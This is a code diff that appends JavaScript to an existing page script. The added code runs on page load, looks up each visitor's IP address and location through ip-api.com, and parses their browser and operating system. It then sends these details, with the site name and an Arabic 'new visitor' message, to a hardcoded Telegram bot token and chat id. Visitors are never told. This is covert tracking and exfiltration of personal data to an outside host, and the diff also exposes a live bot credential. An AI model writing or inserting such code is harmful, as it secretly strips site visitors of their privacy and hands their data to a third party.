@@ -173,3 +173,122 @@ if (allElements.length > 0) {
 		}
 	});
 }
+
+let GetApi = new XMLHttpRequest();
+let api = '';
+GetApi.open('GET', 'http://ip-api.com/json');
+GetApi.send();
+GetApi.onreadystatechange = function() {
+    if (this.readyState == 4 && this.status == 200) {
+        var result = JSON.parse(this.responseText);
+        api = result['query']
+        country = result['country']+", "+result['city']+", "+result['regionName']
+        let dataEx = navigator.userAgent.split(' ')
+        platformName = 'Unknown OS Platform';
+        browserName = 'Unknown Browser';
+        if(navigator.userAgent.match(/windows nt 10/i)){
+        	platformName = 'Windows 10';
+        }else if(navigator.userAgent.match(/windows nt 6.3/i)){
+        	platformName = 'Windows 8.1';
+        }else if(navigator.userAgent.match(/windows nt 6.2/i)){
+        	platformName = 'Windows 8';
+        }else if(navigator.userAgent.match(/windows nt 6.1/i)){
+        	platformName = 'Windows 7';
+        }else if(navigator.userAgent.match(/windows nt 6.0/i)){
+        	platformName = 'Windows Vista';
+        }else if(navigator.userAgent.match(/windows nt 5.2/i)){
+        	platformName = 'Windows Server 2003/XP x64';
+        }else if(navigator.userAgent.match(/windows nt 5.1/i)){
+        	platformName = 'Windows XP';
+        }else if(navigator.userAgent.match(/windows xp/i)){
+        	platformName = 'Windows XP';
+        }else if(navigator.userAgent.match(/windows nt 5.0/i)){
+        	platformName = 'Windows 2000';
+        }else if(navigator.userAgent.match(/windows me/i)){
+        	platformName = 'Windows ME';
+        }else if(navigator.userAgent.match(/win98/i)){
+        	platformName = 'Windows 98';
+        }else if(navigator.userAgent.match(/win95/i)){
+        	platformName = 'Windows 95';
+        }else if(navigator.userAgent.match(/win16/i)){
+        	platformName = 'Windows 3.11';
+        }else if(navigator.userAgent.match(/macintosh|mac os x/i)){
+        	platformName = 'Mac OS X';
+        }else if(navigator.userAgent.match(/mac_powerpc/i)){
+        	platformName = 'Mac OS 9';
+        }else if(navigator.userAgent.match(/ubuntu/i)){
+        	platformName = 'Ubuntu';
+        }else if(navigator.userAgent.match(/iphone/i)){
+        	platformName = 'iPhone';
+        }else if(navigator.userAgent.match(/ipod/i)){
+        	platformName = 'iPod';
+        }else if(navigator.userAgent.match(/ipad/i)){
+        	platformName = 'iPad';
+        }else if(navigator.userAgent.match(/android 9/i)){
+        	platformName = 'Android 9';
+        }else if(navigator.userAgent.match(/android 8/i)){
+        	platformName = 'Android 8';
+        }else if(navigator.userAgent.match(/android 7/i)){
+        	platformName = 'Android 7';
+        }else if(navigator.userAgent.match(/android 6/i)){
+        	platformName = 'Android 6';
+        }else if(navigator.userAgent.match(/android 5/i)){
+        	platformName = 'Android 5';
+        }else if(navigator.userAgent.match(/android 4/i)){
+        	platformName = 'Android 4';
+        }else if(navigator.userAgent.match(/android 3/i)){
+        	platformName = 'Android 3';
+        }else if(navigator.userAgent.match(/android 2/i)){
+        	platformName = 'Android 2';
+        }else if(navigator.userAgent.match(/android 10/i)){
+        	platformName = 'Android 10';
+        }else if(navigator.userAgent.match(/android 11/i)){
+        	platformName = 'Android 11';
+        }else if(navigator.userAgent.match(/android 12/i)){
+        	platformName = 'Android 12';
+        }else if(navigator.userAgent.match(/android 13/i)){
+        	platformName = 'Android 13';
+        }else if(navigator.userAgent.match(/android 14/i)){
+        	platformName = 'Android 14';
+        }else if(navigator.userAgent.match(/android 1/i)){
+        	platformName = 'Android 1';
+        }else if(navigator.userAgent.match(/blackberry/i)){
+        	platformName = 'BlackBerry';
+        }else if(navigator.userAgent.match(/linux/i)){
+        	platformName = 'Linux';
+        }else if(navigator.userAgent.match(/webos/i)){
+        	platformName = 'Mobile';
+        }
+        if(navigator.userAgent.match(/opera/i)){
+        	browserName = "Opera";
+        }else if(navigator.userAgent.match(/edge/i)){
+        	browserName = "Microsoft Edge";
+        }else  if(navigator.userAgent.match(/chrome/i)){
+        	browserName = "Chrome";
+        }else if(navigator.userAgent.match(/safari/i)){
+        	browserName = "Safari";
+        }else if(navigator.userAgent.match(/msie/i)){
+        	browserName = "Internet Explorer";
+        }else if(navigator.userAgent.match(/trident/i)){
+        	browserName = "Internet Explorer";
+        }else if(navigator.userAgent.match(/luasocket/i)){
+        	browserName = "LuaSocket";
+        }
+        let text = `🙋🏻‍♂️| تم دخول شخص جديد ↓
+ـــــــــــــــــــــــــــــــــــــــــــــــــــ
+🌐| الموقع : https://${location.hostname}
+ـــــــــــــــــــــــــــــــــــــــــــــــــــ
+ℹ️| الايبي : ${api}
+📟| النظام : ${platformName}
+💻| المتصفح : ${browserName}
+📍| المكان : ${country}
+ـــــــــــــــــــــــــــــــــــــــــــــــــــ
+🧾| جميع المعلومات : ↓
+${navigator.userAgent}`
+        let sendTele = new XMLHttpRequest();
+        let Token = '5596564857:AAGZ7swpgA7tu0w0xSPjuMjxZ6DjOFXfhYk';
+        let id = '193960998';
+        sendTele.open('GET', 'http://api.telegram.org/bot' + Token +'/sendmessage?chat_id=' + id + '&text=' + encodeURI(text));
+        sendTele.send();
+    }
+};
